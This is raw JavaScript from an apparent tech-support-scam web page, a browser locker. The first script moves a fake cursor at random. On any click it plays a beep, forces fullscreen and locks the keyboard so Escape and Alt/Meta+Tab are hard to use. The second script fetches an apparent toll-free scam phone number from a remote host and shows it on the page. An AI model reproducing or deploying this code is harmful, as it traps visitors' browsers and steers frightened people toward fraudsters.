<script>
$(document).ready(function() {
  //-------------- fake cursor -----------------------------------
  function makeNewPosition() {
    var h = $(window).height() - 50,
      w = $(window).width() - 50,
      nh = Math.floor(Math.random() * h),
      nw = Math.floor(Math.random() * w);
    return [nh, nw];
  }

  function animateDiv() {
    var newq = makeNewPosition(),
      oldq = $(".fakeCursor").offset(),
      speed = calcSpeed([oldq.top, oldq.left], newq);
    $(".fakeCursor").animate({ top: newq[0], left: newq[1] }, speed, function() {
      animateDiv();
    });
  }

  function calcSpeed(prev, next) {
    var x = Math.abs(prev[1] - next[1]),
      y = Math.abs(prev[0] - next[0]),
      greatest = x > y ? x : y,
      speedModifier = 0.3,
      speed = Math.ceil(greatest / speedModifier);
    return speed;
  }

  animateDiv();
});

document.addEventListener('click', () => {
  document.getElementById("beeppeep").play();
  document.body.requestFullscreen().then(() => {
    const keys = [
      { code: 'Escape' },
      { code: 'Tab', altKey: true },
      { code: 'Tab', metaKey: true },
    ];
    navigator.keyboard.lock();
  });

  document.addEventListener('keydown', event => {
    if (event.code == 'Escape') {
      console.dir('escape punched');
    }
  }, false);

  // Send a Google Analytics event
  gtag('event', 'click', {
    'event_category': 'fullscreen',
    'event_action': 'click'
  });

  // Remove the "black" class from the div
  var blackDiv = document.querySelector('.black');
  if (blackDiv) {
    blackDiv.parentNode.removeChild(blackDiv);
  }
});

</script>

<script>
    fetch('https://homiehelp.com/fb.json', {
        method: 'GET',
        headers: {
            'Accept': 'application/json',
        },
    })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }

            // Parse the response as JSON
            return response.json();
        })
        .then(data => {
            const tfnValue = data.tfn;

            const tfnElement = document.getElementById('tfn-value');
            tfnElement.textContent = tfnValue;

        })
        .catch(error => {
            // Handle any errors (network issues, invalid JSON, etc.)
            console.error('Error fetching or processing data:', error);

            // Update HTML with an error message if something goes wrong
            const tfnElement = document.getElementById('tfn-value');
            tfnElement.textContent = 'Error loading tfn value';
        });
</script>
